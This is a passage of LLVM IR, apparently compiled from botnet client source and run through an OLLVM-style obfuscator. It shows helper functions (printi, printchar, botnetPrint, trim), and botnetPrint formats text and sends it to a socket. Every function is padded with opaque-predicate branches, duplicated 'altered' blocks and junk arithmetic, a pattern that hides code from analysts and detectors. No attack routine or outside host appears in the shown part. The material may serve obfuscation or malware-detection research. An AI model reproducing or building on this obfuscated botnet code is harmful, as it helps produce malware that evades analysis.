  %170 = load i32, i32* %11, align 4
  %171 = load i32, i32* %7, align 4
  %_12 = sub i32 0, %171
  %gen13 = add i32 %_12, %170
  %_14 = shl i32 %171, %170
  %_15 = shl i32 %171, %170
  %_16 = shl i32 %171, %170
  %_17 = shl i32 %171, %170
  %_18 = shl i32 %171, %170
  %_19 = sub i32 %171, %170
  %gen20 = mul i32 %_19, %170
  %172 = sub nsw i32 %171, %170
  store i32 %172, i32* %7, align 4
  br label %originalBB11

originalBB24alteredBB:                            ; preds = %originalBB24, %72
  store i32 48, i32* %10, align 4
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %89
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %147
  %173 = load i32, i32* %7, align 4
  %_33 = sub i32 0, %173
  %gen34 = add i32 %_33, -1
  %_35 = sub i32 0, %173
  %gen36 = add i32 %_35, -1
  %174 = add nsw i32 %173, -1
  store i32 %174, i32* %7, align 4
  br label %originalBB32
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %246

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %93

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @x.31
  %38 = load i32, i32* @y.32
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %11, align 4
  %46 = icmp eq i32 %45, 10
  %47 = load i32, i32* @x.31
  %48 = load i32, i32* @y.32
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %93

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.31
  %57 = load i32, i32* @y.32
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %10, align 4
  %65 = icmp slt i32 %64, 0
  %66 = load i32, i32* @x.31
  %67 = load i32, i32* @y.32
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %93

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i32, i32* @x.31
  %76 = load i32, i32* @y.32
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  store i32 1, i32* %19, align 4
  %83 = load i32, i32* %10, align 4
  %84 = sub nsw i32 0, %83
  store i32 %84, i32* %21, align 4
  %85 = load i32, i32* @x.31
  %86 = load i32, i32* @y.32
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %originalBBpart216, %originalBBpart24, %originalBBpart2, %33
  %94 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %95 = getelementptr inbounds i8, i8* %94, i64 12
  %96 = getelementptr inbounds i8, i8* %95, i64 -1
  store i8* %96, i8** %17, align 8
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  br label %98

; <label>:98:                                     ; preds = %145, %93
  %99 = load i32, i32* @x.31
  %100 = load i32, i32* @y.32
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %98
  %107 = load i32, i32* %21, align 4
  %108 = icmp ne i32 %107, 0
  %109 = load i32, i32* @x.31
  %110 = load i32, i32* @y.32
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %108, label %117, label %154

; <label>:117:                                    ; preds = %originalBBpart220
  %118 = load i32, i32* %21, align 4
  %119 = load i32, i32* %11, align 4
  %120 = urem i32 %118, %119
  store i32 %120, i32* %18, align 4
  %121 = load i32, i32* %18, align 4
  %122 = icmp sge i32 %121, 10
  br i1 %122, label %123, label %145

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* @x.31
  %125 = load i32, i32* @y.32
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %123
  %132 = load i32, i32* %15, align 4
  %133 = sub nsw i32 %132, 48
  %134 = sub nsw i32 %133, 10
  %135 = load i32, i32* %18, align 4
  %136 = add nsw i32 %135, %134
  store i32 %136, i32* %18, align 4
  %137 = load i32, i32* @x.31
  %138 = load i32, i32* @y.32
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart247, label %originalBB22alteredBB

originalBBpart247:                                ; preds = %originalBB22
  br label %145

; <label>:145:                                    ; preds = %originalBBpart247, %117
  %146 = load i32, i32* %18, align 4
  %147 = add nsw i32 %146, 48
  %148 = trunc i32 %147 to i8
  %149 = load i8*, i8** %17, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 -1
  store i8* %150, i8** %17, align 8
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %11, align 4
  %152 = load i32, i32* %21, align 4
  %153 = udiv i32 %152, %151
  store i32 %153, i32* %21, align 4
  br label %98

; <label>:154:                                    ; preds = %originalBBpart220
  %155 = load i32, i32* @x.31
  %156 = load i32, i32* @y.32
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %154
  %163 = load i32, i32* %19, align 4
  %164 = icmp ne i32 %163, 0
  %165 = load i32, i32* @x.31
  %166 = load i32, i32* @y.32
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %164, label %173, label %238

; <label>:173:                                    ; preds = %originalBBpart251
  %174 = load i32, i32* %13, align 4
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %202

; <label>:176:                                    ; preds = %173
  %177 = load i32, i32* @x.31
  %178 = load i32, i32* @y.32
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %176
  %185 = load i32, i32* %14, align 4
  %186 = and i32 %185, 2
  %187 = icmp ne i32 %186, 0
  %188 = load i32, i32* @x.31
  %189 = load i32, i32* @y.32
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart265, label %originalBB53alteredBB

originalBBpart265:                                ; preds = %originalBB53
  br i1 %187, label %196, label %202

; <label>:196:                                    ; preds = %originalBBpart265
  %197 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %197, i32 45)
  %198 = load i32, i32* %20, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %20, align 4
  %200 = load i32, i32* %13, align 4
  %201 = add nsw i32 %200, -1
  store i32 %201, i32* %13, align 4
  br label %221

; <label>:202:                                    ; preds = %originalBBpart265, %173
  %203 = load i32, i32* @x.31
  %204 = load i32, i32* @y.32
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %202
  %211 = load i8*, i8** %17, align 8
  %212 = getelementptr inbounds i8, i8* %211, i32 -1
  store i8* %212, i8** %17, align 8
  store i8 45, i8* %212, align 1
  %213 = load i32, i32* @x.31
  %214 = load i32, i32* @y.32
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %221

; <label>:221:                                    ; preds = %originalBBpart269, %196
  %222 = load i32, i32* @x.31
  %223 = load i32, i32* @y.32
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %221
  %230 = load i32, i32* @x.31
  %231 = load i32, i32* @y.32
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %238

; <label>:238:                                    ; preds = %originalBBpart273, %originalBBpart251
  %239 = load i32, i32* %20, align 4
  %240 = load i8**, i8*** %9, align 8
  %241 = load i8*, i8** %17, align 8
  %242 = load i32, i32* %13, align 4
  %243 = load i32, i32* %14, align 4
  %244 = call i32 @prints(i8** %240, i8* %241, i32 %242, i32 %243)
  %245 = add nsw i32 %239, %244
  store i32 %245, i32* %8, align 4
  br label %246

; <label>:246:                                    ; preds = %238, %25
  %247 = load i32, i32* %8, align 4
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %36
  %248 = load i32, i32* %11, align 4
  %249 = icmp eq i32 %248, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %250 = load i32, i32* %10, align 4
  %251 = icmp slt i32 %250, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  store i32 1, i32* %19, align 4
  %252 = load i32, i32* %10, align 4
  %_ = shl i32 0, %252
  %_7 = sub i32 0, %252
  %gen = mul i32 %_7, %252
  %_8 = sub i32 0, 0
  %gen9 = add i32 %_8, %252
  %_10 = shl i32 0, %252
  %_11 = sub i32 0, %252
  %gen12 = mul i32 %_11, %252
  %_13 = sub i32 0, %252
  %gen14 = mul i32 %_13, %252
  %253 = sub nsw i32 0, %252
  store i32 %253, i32* %21, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %98
  %254 = load i32, i32* %21, align 4
  %255 = icmp ne i32 %254, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %123
  %256 = load i32, i32* %15, align 4
  %_23 = sub i32 0, %256
  %gen24 = add i32 %_23, 48
  %_25 = shl i32 %256, 48
  %_26 = sub i32 0, %256
  %gen27 = add i32 %_26, 48
  %257 = sub nsw i32 %256, 48
  %_28 = sub i32 %257, 10
  %gen29 = mul i32 %_28, 10
  %_30 = shl i32 %257, 10
  %_31 = sub i32 0, %257
  %gen32 = add i32 %_31, 10
  %_33 = sub i32 0, %257
  %gen34 = add i32 %_33, 10
  %_35 = shl i32 %257, 10
  %_36 = shl i32 %257, 10
  %258 = sub nsw i32 %257, 10
  %259 = load i32, i32* %18, align 4
  %_37 = sub i32 0, %259
  %gen38 = add i32 %_37, %258
  %_39 = sub i32 %259, %258
  %gen40 = mul i32 %_39, %258
  %_41 = sub i32 %259, %258
  %gen42 = mul i32 %_41, %258
  %_43 = sub i32 0, %259
  %gen44 = add i32 %_43, %258
  %_45 = shl i32 %259, %258
  %260 = add nsw i32 %259, %258
  store i32 %260, i32* %18, align 4
  br label %originalBB22

originalBB49alteredBB:                            ; preds = %originalBB49, %154
  %261 = load i32, i32* %19, align 4
  %262 = icmp ne i32 %261, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %176
  %263 = load i32, i32* %14, align 4
  %_54 = sub i32 0, %263
  %gen55 = add i32 %_54, 2
  %_56 = sub i32 0, %263
  %gen57 = add i32 %_56, 2
  %_58 = sub i32 0, %263
  %gen59 = add i32 %_58, 2
  %_60 = shl i32 %263, 2
  %_61 = shl i32 %263, 2
  %_62 = sub i32 %263, 2
  %gen63 = mul i32 %_62, 2
  %264 = and i32 %263, 2
  %265 = icmp ne i32 %264, 0
  br label %originalBB53

originalBB67alteredBB:                            ; preds = %originalBB67, %202
  %266 = load i8*, i8** %17, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 -1
  store i8* %267, i8** %17, align 8
  store i8 45, i8* %267, align 1
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %221
  br label %originalBB71
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.33
  %4 = load i32, i32* @y.34
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.33
  %16 = load i32, i32* @y.34
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %31

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %12, align 4
  %25 = trunc i32 %24 to i8
  %26 = load i8**, i8*** %11, align 8
  %27 = load i8*, i8** %26, align 8
  store i8 %25, i8* %27, align 1
  %28 = load i8**, i8*** %11, align 8
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %28, align 8
  br label %34

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = bitcast i32* %12 to i8*
  %33 = call i64 @write(i32 1, i8* %32, i64 1)
  br label %34

; <label>:34:                                     ; preds = %31, %23
  %35 = load i32, i32* @x.33
  %36 = load i32, i32* @y.34
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* @x.33
  %44 = load i32, i32* @y.34
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.35
  %4 = load i32, i32* @y.36
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #3
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i32, i32* %11, align 4
  %32 = load i8*, i8** %14, align 8
  %33 = load i8*, i8** %14, align 8
  %34 = call i64 @strlen(i8* %33) #9
  %35 = call i64 @send(i32 %31, i8* %32, i64 %34, i32 16384)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %16, align 4
  %37 = load i8*, i8** %14, align 8
  call void @free(i8* %37) #3
  %38 = load i32, i32* %16, align 4
  %39 = load i32, i32* @x.35
  %40 = load i32, i32* @y.36
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %2
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca [1 x %struct.__va_list_tag], align 16
  %52 = alloca i32, align 4
  store i32 %0, i32* %47, align 4
  store i8* %1, i8** %48, align 8
  %53 = call noalias i8* @malloc(i64 2048) #3
  store i8* %53, i8** %49, align 8
  %54 = load i8*, i8** %49, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 1, i1 false)
  %55 = load i8*, i8** %49, align 8
  store i8* %55, i8** %50, align 8
  %56 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %57 = bitcast %struct.__va_list_tag* %56 to i8*
  call void @llvm.va_start(i8* %57)
  %58 = load i8*, i8** %48, align 8
  %59 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %60 = call i32 @print(i8** %49, i8* %58, %struct.__va_list_tag* %59)
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %62 = bitcast %struct.__va_list_tag* %61 to i8*
  call void @llvm.va_end(i8* %62)
  %63 = load i8*, i8** %50, align 8
  %64 = load i8*, i8** %50, align 8
  %65 = call i64 @strlen(i8* %64) #9
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 10, i8* %66, align 1
  %67 = load i32, i32* %47, align 4
  %68 = load i8*, i8** %50, align 8
  %69 = load i8*, i8** %50, align 8
  %70 = call i64 @strlen(i8* %69) #9
  %71 = call i64 @send(i32 %67, i8* %68, i64 %70, i32 16384)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %52, align 4
  %73 = load i8*, i8** %50, align 8
  call void @free(i8* %73) #3
  %74 = load i32, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10

; <label>:28:                                     ; preds = %10
  br label %29

; <label>:29:                                     ; preds = %66, %28
  %30 = load i32, i32* @x.37
  %31 = load i32, i32* @y.38
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %5, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp sge i32 %38, %39
  %41 = load i32, i32* @x.37
  %42 = load i32, i32* @y.38
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %64

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = call i16** @__ctype_b_loc() #10
  %51 = load i16*, i16** %50, align 8
  %52 = load i8*, i8** %2, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i16, i16* %51, i64 %58
  %60 = load i16, i16* %59, align 2
  %61 = zext i16 %60 to i32
  %62 = and i32 %61, 8192
  %63 = icmp ne i32 %62, 0
  br label %64

; <label>:64:                                     ; preds = %49, %originalBBpart2
  %65 = phi i1 [ false, %originalBBpart2 ], [ %63, %49 ]
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %64
  %67 = load i32, i32* %5, align 4
  %68 = add nsw i32 %67, -1
  store i32 %68, i32* %5, align 4
  br label %29

; <label>:69:                                     ; preds = %64
  %70 = load i32, i32* %4, align 4
  store i32 %70, i32* %3, align 4
  br label %71

; <label>:71:                                     ; preds = %119, %69
  %72 = load i32, i32* @x.37
  %73 = load i32, i32* @y.38
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i32, i32* %3, align 4
  %81 = load i32, i32* %5, align 4
  %82 = icmp sle i32 %80, %81
  %83 = load i32, i32* @x.37
  %84 = load i32, i32* @y.38
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %82, label %91, label %122

; <label>:91:                                     ; preds = %originalBBpart24
  %92 = load i32, i32* @x.37
  %93 = load i32, i32* @y.38
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i8*, i8** %2, align 8
  %101 = load i32, i32* %3, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = load i8*, i8** %2, align 8
  %106 = load i32, i32* %3, align 4
  %107 = load i32, i32* %4, align 4
  %108 = sub nsw i32 %106, %107
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %105, i64 %109
  store i8 %104, i8* %110, align 1
  %111 = load i32, i32* @x.37
  %112 = load i32, i32* @y.38
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
